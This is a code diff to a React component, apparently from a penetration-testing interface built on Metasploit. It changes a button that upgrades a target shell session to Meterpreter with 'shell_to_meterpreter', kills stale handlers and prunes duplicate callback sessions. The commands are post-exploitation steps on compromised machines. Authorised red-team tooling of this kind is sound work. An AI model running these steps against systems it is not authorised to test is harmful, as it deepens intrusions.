@@ -5271,15 +5271,34 @@ export default function SessionDetail({ onLogout }: SessionDetailProps) {
                                 onClick={async () => {
                                   if (upgradingRef.current.has(s.id)) return;
                                   upgradingRef.current.add(s.id);
-                                  // Must be at msf> prompt — background any active interactive session first
                                   await ensureMsfPrompt();
+                                  // Kill stale background handlers before upgrading.
+                                  // A leftover handler on the same port accepts callbacks from every
+                                  // interface on the target, creating spurious extra sessions.
+                                  await sendShellCmd('jobs -K');
                                   await sendShellCmd('use post/multi/manage/shell_to_meterpreter');
                                   await sendShellCmd(`set SESSION ${s.id}`);
                                   await sendShellCmd('run');
-                                  // Kill the original shell session — the module creates a new meterpreter
-                                  // session (CreateSession default true), leaving the old shell alive and
-                                  // resulting in two meterpreter entries.  Killing s.id removes the duplicate.
+                                  // Kill the original shell — the module always creates a new meterpreter
+                                  // session so the shell would otherwise remain alongside it.
                                   await sendShellCmd(`sessions -k ${s.id}`);
+                                  // Give sessions a moment to finalise, then kill any newly-created
+                                  // sessions that have no Information field — these are spurious callbacks
+                                  // from alternate network interfaces on the target machine.
+                                  await new Promise(r => setTimeout(r, 1500));
+                                  try {
+                                    const res = await axios.get(`/api/sessions/${sessionId}/msf-sessions`);
+                                    const fresh = parseMsfSessions(res.data.output || '');
+                                    const origId = parseInt(s.id, 10);
+                                    for (const fs of fresh) {
+                                      if (parseInt(fs.id, 10) > origId && !fs.info.trim()) {
+                                        await sendShellCmd(`sessions -k ${fs.id}`);
+                                      }
+                                    }
+                                    setMsfSessions(fresh.filter(fs =>
+                                      parseInt(fs.id, 10) <= origId || !!fs.info.trim()
+                                    ));
+                                  } catch { /* best-effort */ }
                                   upgradingRef.current.delete(s.id);
                                   loadMsfSessions();
                                 }}
